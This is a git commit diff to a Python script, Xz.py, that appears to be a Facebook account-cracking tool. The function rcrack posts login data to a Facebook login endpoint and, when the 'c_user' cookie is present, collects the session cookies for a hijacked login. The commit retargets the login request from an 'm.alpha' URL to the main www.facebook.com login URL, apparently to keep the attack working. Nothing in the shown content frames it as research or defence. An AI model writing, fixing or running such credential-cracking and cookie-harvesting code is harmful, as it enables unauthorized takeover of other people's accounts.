20e52bb16e3783c9d8f947fd6f4adcb635679bbf
mrrakibkhan420 <134503086+mrrakibkhan420@users.noreply.github.com>
2023-07-24 23:31:53 +0600

    Update Xz.py

--- Xz.py
+++ Xz.py
@@ -320,7 +320,7 @@ def rcrack(uid,pwx,tl):
 	    'sec-fetch-user': '?1',
 	    'upgrade-insecure-requests': '1',
 	    'user-agent': pro}
-	    lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+	    lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
